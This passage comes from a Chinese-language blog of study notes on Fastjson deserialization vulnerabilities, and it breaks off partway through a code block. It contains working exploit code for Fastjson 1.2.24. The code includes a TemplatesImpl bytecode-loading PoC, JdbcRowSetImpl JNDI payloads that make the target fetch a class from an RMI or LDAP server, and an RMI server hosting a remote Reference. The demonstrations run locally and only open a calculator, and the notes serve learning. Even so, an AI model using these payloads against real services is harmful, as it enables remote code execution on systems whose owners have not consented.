<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">human</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line">    <span class="keyword">private</span> Properties properties;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">human</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAddress</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAddress&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Properties <span class="title function_">getProperties</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getProperties&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> properties;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在的反序列化代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">humanUnSerialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;human\&quot;,\&quot;age\&quot;:20,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;name\&quot;:\&quot;Flow\&quot;,\&quot;address\&quot;:\&quot;china\&quot;,\&quot;properties\&quot;:&#123;&#125;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonString);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        System.out.println(obj.getClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">getProperties</span><br><span class="line">getAddress</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">getProperties</span><br><span class="line">&#123;&quot;name&quot;:&quot;Flow&quot;,&quot;age&quot;:0&#125;</span><br><span class="line">class com.alibaba.fastjson.JSONObject</span><br></pre></td></tr></table></figure>

<p>可以看到调用了构造函数，public属性变量的setter函数，所有变量的getter函数，getProperties还被调用了两次，最后得到的obj是JSONObject类型，这算反序列化失败了</p>
<p>现在把语句改成</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonString,human.class);</span><br></pre></td></tr></table></figure>

<p>输出变成，这样就算成功了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">getProperties</span><br><span class="line">human@2cdf8d8a</span><br><span class="line">class human</span><br></pre></td></tr></table></figure>

<p>我问ai为什么，它说</p>
<blockquote>
<p>是的，将代码改为 <code>Object obj = JSON.parseObject(jsonString, human.class);</code> 后，Fastjson 能够成功将 JSON 反序列化为 <code>human</code> 类的对象。以下是具体原因和机制分析：</p>
<p><strong>1. 显式指定目标类的作用</strong></p>
<p>通过 <code>JSON.parseObject(jsonString, human.class)</code> <strong>明确告知 Fastjson 目标类</strong>，此时 Fastjson 的行为会发生变化：</p>
<ul>
<li><strong>绕过 <code>@type</code> 的自动解析</strong>：即使 JSON 中包含 <code>@type</code> 字段，Fastjson 也会优先使用你传入的 <code>human.class</code> 作为目标类。</li>
<li><strong>直接实例化 <code>human</code> 对象</strong>：Fastjson 会通过反射创建 <code>human</code> 类的实例，并尝试将 JSON 字段映射到该类的字段或 setter 方法。</li>
</ul>
<p><strong>2. 原代码失败的原因</strong></p>
<p>原代码 <code>JSON.parseObject(jsonString)</code> 未指定目标类，Fastjson 会尝试根据 JSON 中的 <code>@type</code> 字段动态加载类：</p>
<ul>
<li><strong>依赖 <code>@type</code> 的类加载机制</strong>：<code>@type</code> 字段的值 <code>human</code> 需要对应一个全限定类名（如 <code>com.example.human</code>），且该类必须在类路径中可访问。</li>
<li>原代码的问题：<ul>
<li>如果 <code>human</code> 类未正确定义或未被正确加载，Fastjson 无法找到该类，会回退到通用 <code>JSONObject</code>。</li>
<li>即使 <code>human</code> 类存在，某些 Fastjson 版本默认禁用 <code>@type</code> 功能（出于安全考虑），导致动态类加载失败。</li>
</ul>
</li>
</ul>
</blockquote>
<h4 id="parse与parseObject区别"><a href="#parse与parseObject区别" class="headerlink" title="parse与parseObject区别"></a>parse与parseObject区别</h4><p>两者主要的区别就是<code>parseObject()</code>返回的是JSONObject而<code>parse()</code>返回的是实际类型的对象，当在没有对应类的定义的情况下，一般情况下都会使用<code>JSON.parseObject()</code>来获取数据。</p>
<blockquote>
<p>FastJson中的 <code>parse()</code> 和 <code>parseObject()</code> 方法都可以用来将JSON字符串反序列化成Java对象，<code>parseObject()</code> 本质上也是调用 <code>parse()</code> 进行反序列化的。但是 <code>parseObject()</code> 会额外的将Java对象转为 JSONObject对象，即 <code>JSON.toJSON()</code>。所以进行反序列化时的细节区别在于，<code>parse()</code> 会识别并调用目标类的 <code>setter</code> 方法及某些特定条件的 <code>getter</code> 方法，而 <code>parseObject()</code> 由于多执行了 <code>JSON.toJSON(obj)</code>，所以在处理过程中会调用反序列化目标类的所有 <code>setter</code> 和 <code>getter</code> 方法。</p>
</blockquote>
<p>所以使用parse()的时候他会自动反序列化得到特定的类，不用想parseObject()一样指定第二个参数，看看效果</p>
<p>现在的代码是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">humanUnSerialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;human\&quot;,\&quot;age\&quot;:20,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;name\&quot;:\&quot;Flow\&quot;,\&quot;address\&quot;:\&quot;china\&quot;,\&quot;properties\&quot;:&#123;&#125;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parse(jsonString);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        System.out.println(obj.getClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">getProperties</span><br><span class="line">human@2cdf8d8a</span><br><span class="line">class human</span><br></pre></td></tr></table></figure>

<p>所以就是要用 <code>parseObject</code>，里面的参数需要是 <code>Object.class</code></p>
<h3 id="Fastjson反序列化原理"><a href="#Fastjson反序列化原理" class="headerlink" title="Fastjson反序列化原理"></a>Fastjson反序列化原理</h3><blockquote>
<p>fastjson 在反序列化的时候会去找我们在 <code>@type</code> 中规定的类是哪个类，然后在反序列化的时候会自动调用这些 setter 与 getter 方法的调用，注意！并不是所有的 setter 和 getter 方法。</p>
</blockquote>
<p>fastjson会对下列要求的setter和getter方法进行调用</p>
<p>满足条件的setter：</p>
<ul>
<li>非静态函数</li>
<li>返回类型为void或当前类</li>
<li>参数个数为1个</li>
</ul>
<p>满足条件的getter：</p>
<ul>
<li>非静态方法</li>
<li>无参数</li>
<li><strong>返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</strong></li>
</ul>
<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>通过fastjson反序列化漏洞，攻击者可以传入恶意构造的json内容，程序对他反序列化后得到恶意类执行力恶意类中的恶意函数，从而导致代码执行</p>
<p>fastjson用parse()&#x2F;parseObject()反序列化的时候可以指定类型，如果刚好指定的类型有很多子类，有很多子函数，就比较有利用空间。</p>
<blockquote>
<p>例如，如果指定类型为Object或JSONObject，则可以反序列化出来任意类。例如代码写<code>Object o = JSON.parseObject(poc,Object.class)</code>就可以反序列化出Object类或其任意子类，而Object又是任意类的父类，所以就可以反序列化出所有类。</p>
</blockquote>
<h4 id="如何触发恶意函数？"><a href="#如何触发恶意函数？" class="headerlink" title="如何触发恶意函数？"></a>如何触发恶意函数？</h4><p>某种情况下，反序列化后会把反序列化得到的类中的<strong>构造函数，getter，setter都执行一遍</strong>，如果这三个里面存在恶意函数，这就是反序列化漏洞所在！所以触发方式就在这三个里面</p>
<p>所以利用反序列化漏洞的关键：</p>
<ul>
<li>某个类的构造函数、<code>setter</code>方法、<code>getter</code>方法中的某一个存在危险操作，比如造成命令执行；</li>
<li>可以控制该漏洞函数的变量（一般就是该类的属性）；</li>
</ul>
<h4 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h4><p>如果反序列化指定的类型的是Object.class，也就是代码是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstring, Object.class, Feature.SupportNonPublicField);</span><br></pre></td></tr></table></figure>

<p>反序列化得到的类的构造函数、所有属性的<code>setter</code>方法、properties私有属性的<code>getter</code>方法都会被调用</p>
<p>现在做个尝试，改一下human.java里面的getter函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Properties <span class="title function_">getProperties</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getProperties&quot;</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open -a calculator&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> properties;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>再执行代码就跳出计算机</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">humanUnSerialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;human\&quot;,\&quot;age\&quot;:20,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;name\&quot;:\&quot;Flow\&quot;,\&quot;address\&quot;:\&quot;china\&quot;,\&quot;properties\&quot;:&#123;&#125;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonString,Object.class,Feature.SupportNonPublicField);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        System.out.println(obj.getClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当前反序列化里面指定的类是Object.class，他是所有类的父类，所以他的子类的human的getter函数存在恶意函数，当@type指向human类是反序列化就会触发漏洞</p>
<p>如果你知道这个类本事就有问题，直接指定类名也是可以的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonString,human.class,Feature.SupportNonPublicField);</span><br></pre></td></tr></table></figure>

<p>看代码触发语句就是</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250419195740.png" ></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a class="link"   href="https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80" >https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>java</tag>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-Fastjson-1.2.24漏洞学习笔记</title>
    <url>/2025/04/19/Java-Fastjson-1-2-24%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul>
<li>jdk8u65</li>
</ul>
<ul>
<li>1.2.22 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.24</li>
</ul>
<p>依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.unboundid<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-codec<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-codec<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="基于-TemplatesImpl-的利用链"><a href="#基于-TemplatesImpl-的利用链" class="headerlink" title="基于 TemplatesImpl 的利用链"></a>基于 TemplatesImpl 的利用链</h3><p>之前cc3就遇到这个TemplatesImpl的利用，就是字节码的加载，当时针对这个的链子是这样的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties()</span><br><span class="line"> 	-&gt;TemplatesImpl#newTransformer()</span><br><span class="line">		-&gt; TemplatesImpl#getTransletInstance()</span><br><span class="line">			-&gt; TemplatesImpl#defineTransletClasses()</span><br><span class="line">				-&gt; TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure>

<p>刚好这个<code>getOutputProperties()</code>就是一个getter方法，之前CB1链子也提到过。再针对fastjson反序列化的特性，反序列化得到类之后会自动执行该类的构造函数，getter方法，setter方法，所以现在我们就控制要反序列化的对象是&#96;&#96;TemplatesImpl&#96;类就好</p>
<p>再看一次能被利用的getter和setter的要求</p>
<p>满足条件的setter：</p>
<ul>
<li>非静态函数</li>
<li>返回类型为void或当前类</li>
<li>参数个数为1个</li>
</ul>
<p>满足条件的getter：</p>
<ul>
<li>非静态方法</li>
<li>无参数</li>
<li><strong>返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</strong></li>
</ul>
<p>其实TemplatesImpl类也有别的getter函数会被调用，但是getOutputProperties()目前最符合我们的要求，它的返回值是Properties类型也继承自Map类</p>
<p>现在尝试写poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readClass</span><span class="params">(String cls)</span>&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            IOUtils.copy(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(cls)), bos);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Base64.encodeBase64String(bos.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">evilPath</span> <span class="operator">=</span> <span class="string">&quot;/Users/lingtian/Downloads/Demo/CC3/target/classes/com/Calc.class&quot;</span>; <span class="comment">// 读字节码</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">evilCode</span> <span class="operator">=</span> readClass(evilPath);</span><br><span class="line">        <span class="type">String</span> <span class="variable">evil_Class</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonText</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + evil_Class + <span class="string">&quot;\&quot;,\&quot;_bytecodes\&quot;: [\&quot;&quot;</span>+evilCode+<span class="string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;flow&#x27;,&#x27;_tfactory&#x27;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span>;</span><br><span class="line">      System.out.println(jsonText);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonText,Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意到这里有个config，看了一下</p>
<p><strong><code>ParserConfig</code> 的作用</strong></p>
<p><code>ParserConfig</code> <strong>控制反序列化时的关键行为</strong>，包含：</p>
<ul>
<li><strong>自动类型检测（<code>autoTypeSupport</code>）</strong>：决定是否允许反序列化未明确声明的类。</li>
<li><strong>白名单&#x2F;黑名单</strong>：限制可反序列化的类。</li>
<li><strong>自定义反序列化解析器</strong>：处理特定类的实例化方式。</li>
</ul>
<p>若未显式传递<code>ParserConfig</code>，Fastjson默认使用全局配置（<code>ParserConfig.getGlobalInstance()</code>）。如果全局配置的<code>autoTypeSupport</code>为<code>false</code>（默认安全配置），则<code>TemplatesImpl</code>若不在白名单会导致反序列化失败。<br>传递自定义的<code>ParserConfig</code>则<strong>覆盖全局配置</strong>，使用新实例的独立配置。</p>
<p>这个总体不难理解，就先这样</p>
<h3 id="基于-JdbcRowSetImpl-的利用链"><a href="#基于-JdbcRowSetImpl-的利用链" class="headerlink" title="基于 JdbcRowSetImpl 的利用链"></a>基于 JdbcRowSetImpl 的利用链</h3><p>这个JdbcRowSetImpl类的利用主要就是基于 Bean Property 类型的 JNDI 的利用方式。里面可以找到lookup方法，这个对应上了之前的jndi注入后面的部分</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250420143030.png" ></p>
<p><code>connect()</code>方法找出谁调用了，符合条件的就是<code>setAutoCommit()</code>，所以我们要到时exp要设置autoCommit参数，也要设置datasource才能保证被正确地lookup到，这就是这个链的利用思路</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250420143142.png" ></p>
<h4 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI+RMI"></a>JNDI+RMI</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">	<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://localhost:1099/Exploit&quot;</span>, <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务端</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NamingException &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/calc&quot;</span>, reference);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonText</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/calc\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parse(jsonText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功弹出计算器</p>
<h4 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI+LDAP"></a>JNDI+LDAP</h4><p>原理和之前差不多</p>
<p>这里我用工具起一个ldap服务器，再改一下客户端代码就好了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonText</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1/HuoyZUQEBX/CommonsCollections6/Exec/eyJjbWQiOiJvcGVuIC1hIGNhbGN1bGF0b3IifQ==\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parse(jsonText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="LDAP高版本绕过"><a href="#LDAP高版本绕过" class="headerlink" title="LDAP高版本绕过"></a>LDAP高版本绕过</h4><p>如果要高版本绕过，依旧是选择本地恶意类加载就好，用到beanfactory即刻，这里就不掩饰了</p>
<h3 id="基于BasicDataSouce的利用链"><a href="#基于BasicDataSouce的利用链" class="headerlink" title="基于BasicDataSouce的利用链"></a>基于BasicDataSouce的利用链</h3><p>这个和tomcat相关，好处是可以不出网，用到本地的恶意类加载</p>
<p>tomcat有一个<code>org.apache.bcel.util.ClassLoader</code>类，里面有defineClass实现类加载</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250420154253.png" ></p>
<p>要瞒住这段代码然后创建一个类名再到后面defineClass</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">	clazz = <span class="built_in">this</span>.createClass(class_name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以现在先想办法调用<code>loadClass()</code>，现在尝试直接调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.bcel.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> org.apache.bcel.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BasicPoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span 